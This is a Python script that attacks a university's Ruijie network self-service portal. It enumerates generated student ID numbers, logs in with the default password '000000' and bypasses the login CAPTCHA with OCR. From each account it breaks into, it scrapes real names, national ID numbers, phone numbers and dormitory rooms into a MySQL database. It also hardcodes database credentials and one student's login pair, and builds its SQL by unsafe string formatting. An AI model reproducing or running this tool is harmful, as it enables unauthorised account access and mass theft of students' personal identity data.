# coding=utf-8

import requests
import re
from PIL import Image
import pytesseract
import pymysql
import time

error_count = 0
student_count = 0
db = pymysql.connect("localhost", "Acring", "Acring4ever", "gzdxstu")
db.set_charset('utf8')
cursor = db.cursor()
sql = """CREATE TABLE  IF NOT EXISTS rjuser(
                  USERNAME VARCHAR(20) ,
                  REALNAME VARCHAR(20),
                  SEX VARCHAR(20) ,
                  IDTYPE VARCHAR(20) ,
                  SID VARCHAR(20) ,
                  PHONE VARCHAR(20) ,
                  COLLEGE VARCHAR(20) ,
                  LOCATION VARCHAR(20) ,
                  ROOM VARCHAR(20)
              );"""
cursor.execute(sql)

headers = {
        "Host": "202.192.18.32:8080",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0"
}
s = requests.session()
s.headers = headers


class RjLogin(object):
    login_judge_url = "http://202.192.18.32:8080/selfservice/module/scgroup/web/login_judge.jsf"
    index_self_url = "http://202.192.18.32:8080/selfservice/module/webcontent/web/index_self.jsf?"
    content_self_url = "http://202.192.18.32:8080/selfservice/module/webcontent/web/content_self.jsf"
    userinfo_url = "http://202.192.18.32:8080/selfservice/module/userself/web/regpassuserinfo_login.jsf"
    getted_user_info = False
    data = {
        "act": "add",
        "name": "",
        "password": "",
        "verify": ""
    }
    user_inf = {
        "username" : "",
        "real_name": "",
        "sex": "",
        "idtype" : "",
        "sid": "",
        "phone": "",
        "college": "",
        "location": "",
        "room": ""
    }

    def __init__(self, username, password):
        self.data["name"] = username
        self.data["password"] = password

    def save(self):  # 保存信息到MySQL数据库
        if not self.getted_user_info:
            return
        print(self.data["name"] + ": 正在保存...")
        sql = """INSERT INTO rjuser(
                USERNAME,
                REALNAME,
                SEX,
                IDTYPE,
                SID,
                PHONE,
                COLLEGE,
                LOCATION,
                ROOM ) VALUES ('{0}','{1}','{2}','{3}','{4}','{5}','{6}','{7}','{8}'
                );
                """.format(self.user_inf["username"], self.user_inf["real_name"], self.user_inf["sex"], self.user_inf["idtype"],
                           self.user_inf["sid"], self.user_inf["phone"], self.user_inf["college"], self.user_inf["location"], self.user_inf["room"])
        try:
            cursor.execute(sql)
            db.commit()
            global student_count
            student_count +=1
        except pymysql.Error as e:
            print("信息有误")
            return 0

    def get_user_inf(self):
        if self.login() == 0:
            return

        try:
            inf = s.get(self.userinfo_url)
            username = re.findall('用户名.*?</td>.*?<td align="left" width="32%">(.*?)</td>', inf.text, re.S)[0]
            username = username.strip("\t\n\r")
            self.user_inf["username"] = username

            real_name = re.findall('用户姓名.*?</td>.*?<td align="left" width="32%">(.*?)</td>', inf.text, re.S)[0]
            real_name = real_name.strip("\t\n\r")
            self.user_inf["real_name"] = self.decode(real_name)

            sex = re.findall('性别.*?</td>.*?<td align="left" width="32%">(.*?)</td>', inf.text, re.S)[0]
            sex = sex.strip("\t\n\r")
            self.user_inf["sex"] = self.decode(sex)

            idtype = re.findall('证件类型.*?</td>.*?<td align="left" width="32%">(.*?)</td>', inf.text, re.S)[0]
            idtype = idtype.strip("\t\n\r")
            self.user_inf["idtype"] = self.decode(idtype)

            sid = re.findall('证件号码.*?</td>.*?<td align="left" width="32%">.*?<span id="RegUserinfoForm:certificateNo">(.*?)</span>', inf.text, re.S)[0]
            sid = sid.strip("\t\n\r")
            self.user_inf["sid"] = sid

            phone = re.findall('移动电话.*?</td>.*?<td align="left" width="32%">.*?<span id="RegUserinfoForm:mobile">(.*?)</span>', inf.text, re.S)[0]
            phone = phone.strip("\t\n\r")
            self.user_inf["phone"] = phone

            college = re.findall('&#38498;&#31995;</td>.*?<td class="atd2">(.*?)</td>', inf.text, re.S)[0]
            college = college.strip("\t\n\r")
            self.user_inf["college"] = self.decode(college)

            location = re.findall('&#27004;&#23431;</td>.*?<td class="atd2">(.*?)</td>', inf.text, re.S)[0]
            location = location.strip("\t\n\r")
            self.user_inf["location"] = location

            room = re.findall('>&#25151;&#38388;&#21495;</td>.*?<td class="atd2">(.*?)</td>', inf.text, re.S)[0]
            room = room.strip("\t\n\r")
            self.user_inf["room"] = room

            print(self.user_inf)
            self.getted_user_info = True
        except:
            print(self.data["username"]+": 获取信息出错")

    def login(self):  # 登录锐捷
        self.get_verify_code()
        self.analyse_verify_code()
        try:
            inf = s.post(self.login_judge_url, data=self.data)  # 尝试登陆
            pattern = "self\.location='login_self\.jsf\?verfiyError=true&name="+"{}'".format(self.data["name"])
            ifverfiyError = re.findall(pattern, inf.text, re.S)
            if ifverfiyError:
                print(self.data["name"] + ": 验证码错误" + ":{}".format(self.data["verify"]))
                return 0

            pattern = "self\.location='login_self\.jsf\?errorMsg=用户不存在或密码错误&name=" + "{}'".format(self.data["name"])
            iferrorMsg = re.findall(pattern, inf.text, re.S)
            if iferrorMsg:
                print(self.data["name"] + ": 用户名或密码错误")
                global error_count
                error_count += 1
                return 0
            error_count = 0
            print("登陆成功")
            return s
        except:
            print(self.data["name"] + ": 登录失败")
            return 0

    def get_verify_code(self):  # 获取验证码
        try:
            inf = s.get("http://202.192.18.32:8080/selfservice/common/web/verifycode.jsp")
            with open("tmp\\verify_{}.jpg".format(self.data["name"]), "wb")as file:
                file.write(inf.content)
        except Exception as e:
            print(e,"获取验证码出错")

    def analyse_verify_code(self):  # 解析验证码

        im = Image.open("tmp\\verify_{}.jpg".format(self.data["name"]))
        im = im.convert("L")  # 转化为灰度图
        binary_image = im.point(self.init_table(), '1')
        binary_image.save("tmp\\image_{}.jpg".format(self.data["name"]))
        self.data["verify"] = pytesseract.image_to_string(binary_image)
        print("{}:{}".format(self.data["name"], self.data["verify"]))

    @staticmethod
    def init_table(threshold=140):  # 降噪， 二值化
        table = []
        for i in range(256):
            if i < threshold:
                table.append(0)
            else:
                table.append(1)
        return table

    @staticmethod
    def decode(string):  # 解析网页上的中文
        inf = re.findall(r"&#(.*?);", string)
        for i in range(len(inf)):
            inf[i] = str(hex(int(inf[i])))
        for i in range(len(inf)):
            inf[i] = (b'\u' + bytes(inf[i][2:].encode("utf-8"))).decode("unicode-escape")
        string = ""
        for _ in inf:
            string += _
        return string


class Counter(object):  # 学号生成

    s_grade = 16
    e_grade = 16
    n_grade = s_grade

    s_college = 1
    e_college = 21
    n_college = s_college

    s_major = 1
    e_major = 9
    n_major = s_major

    s_num = 1
    e_num = 200
    n_num = s_num

    end = False
    error_limited = 30

    def add_sid(self):
        global error_count
        for self.n_grade in range(self.s_grade, self.e_grade+1):
            for self.n_college in range(self.s_college, self.e_college+1):
                for self.n_major in range(self.s_major, self.e_major+1):
                    for self.n_num in range(self.s_num, self.e_num+1):
                        if error_count >= self.error_limited:
                            error_count = 0
                            break
                        yield "{:d}{:0>2d}{:d}00{:0>3d}".format(self.n_grade, self.n_college, self.n_major, self.n_num)
        print("end")
        end = True

def main():
    start_time = time.clock()
    count = Counter()
    n_sid = count.add_sid()
    for sid in n_sid:
        if not count.end:
            rj = RjLogin(sid, "000000")
            rj.get_user_inf()
            # rj.save()
    end_time = time.clock()
    delta_time = end_time - start_time
    print("总共用时: {}s".format(str(delta_time)))
    print("获取{}人数据".format(str(student_count)))
    db.close()
if __name__ == '__main__':
    rj = RjLogin('1506100007', '050075')
    rj.login()



